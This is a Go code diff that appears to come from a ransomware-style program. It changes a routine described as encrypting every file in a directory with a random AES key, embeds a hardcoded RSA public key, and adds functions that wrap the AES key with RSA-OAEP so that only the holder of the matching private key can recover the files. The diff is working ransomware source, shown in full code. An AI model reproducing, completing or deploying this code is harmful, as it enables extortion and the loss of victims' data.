@@ -4,13 +4,21 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"crypto/x509"
+	"encoding/base64"
+	"encoding/pem"
+	"errors"
 	"fmt"
 	"io"
+	"log"
 	"math/big"
 	"os"
 	"path/filepath"
 )
 
+//used for generating an AES encryption key
 func keygen(maxLength int) ([]byte, error) {
 	possibleCharacters := "abcdefghijklmnopqrstuvwxyz"
 	result := make([]byte, maxLength)
@@ -27,15 +35,26 @@ func keygen(maxLength int) ([]byte, error) {
 	return result, nil
 }
 
-func encrypt() ([]byte, error) {
+//encrypt every file in a given directory, and returns the encrpyted aes key
+func encryptAES() ([]byte, error) {
+	//hardcoded rsa public key
+	rsakey := `-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyMWd90+WsmqDNNvnvFa6
+9/FevI6TU4u2F5lEP5ZJkUQnjxGvg1p2bLYkSs+bEF4xK5y6U398EzZM7SLJAePi
+LRUfggauA+NgGn4Snyu5hbROES4Bq/17Qt0mLkclDOVOMXQ1AQfKzp67cOvJBEyH
+0EIgVefmEzlhUP+CDmde+R7I94xHCmD7xEIj7xvfK/eYD+JN1yoPGLbgliH4XKGj
+THZmiGXq7KOIEPQ+6EeECbOVLIlfRY/y4RJH8vy04tgRHoVQaVcnnyisRkIMSpmD
+824giSFL41c8i+QX7YfGHXlOFqaaq+2Dsx6hQ0+PyKvp1lgmXXys6Yqkp5s9cE1z
+cwIDAQAB
+-----END PUBLIC KEY-----`
 	fmt.Println("starting encrpytion")
-	key, err := keygen(16)
+	aeskey, err := keygen(16)
 	if err != nil {
 		return nil, fmt.Errorf("error generating the key: %s", err.Error())
 	}
-	fmt.Println("aes key:", string(key))
+	fmt.Println("aes key:", string(aeskey))
 
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(aeskey)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create AES cipher block: %w", err)
 	}
@@ -74,11 +93,21 @@ func encrypt() ([]byte, error) {
 		return nil, err
 	}
 
+	fmt.Println("Encrypting AES public key...")
+	pubkeyDec, err := decodePublicKeyFromPEM(rsakey)
+	if err != nil {
+		log.Fatalf("Failed to decode public key: %v", err)
+	}
+	aeskeyEnc, err := encryptRSA(pubkeyDec, []byte(aeskey))
+	if err != nil {
+		log.Fatalf("key encryption failed: %v", err)
+	}
+
 	fmt.Println("encryption successful")
-	return key, nil
+	return []byte(base64.StdEncoding.EncodeToString(aeskeyEnc)), nil
 }
 
-func decrypt(key string) error {
+func decryptAES(key string) error {
 	fmt.Println("startring decryption")
 
 	block, err := aes.NewCipher([]byte(key))
@@ -127,4 +156,38 @@ func decrypt(key string) error {
 
 	fmt.Println("decryption successful")
 	return nil
+}
+
+func decodePublicKeyFromPEM(publicKeyPEM string) (*rsa.PublicKey, error) {
+	block, rest := pem.Decode([]byte(publicKeyPEM))
+	if block == nil {
+		return nil, errors.New("failed to decode PEM block containing public key")
+	}
+	if len(rest) > 0 {
+		log.Printf("Warning: Trailing data found after PEM block in public key input")
+	}
+	if block.Type != "PUBLIC KEY" {
+		return nil, fmt.Errorf("invalid PEM block type: expected 'PUBLIC KEY', got '%s'", block.Type)
+	}
+
+	genericPublicKey, err := x509.ParsePKIXPublicKey(block.Bytes)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse PKIX public key: %w", err)
+	}
+	rsaPublicKey, ok := genericPublicKey.(*rsa.PublicKey)
+	if !ok {
+		return nil, fmt.Errorf("key type assertion failed: public key is not an RSA key (type: %T)", genericPublicKey)
+	}
+
+	return rsaPublicKey, nil
+}
+
+func encryptRSA(publicKey *rsa.PublicKey, plain []byte) ([]byte, error) {
+	oaepHash := sha256.New()
+
+	ciphertext, err := rsa.EncryptOAEP(oaepHash, rand.Reader, publicKey, plain, nil)
+	if err != nil {
+		return nil, fmt.Errorf("error encrypting number: %w", err)
+	}
+	return ciphertext, nil
 }
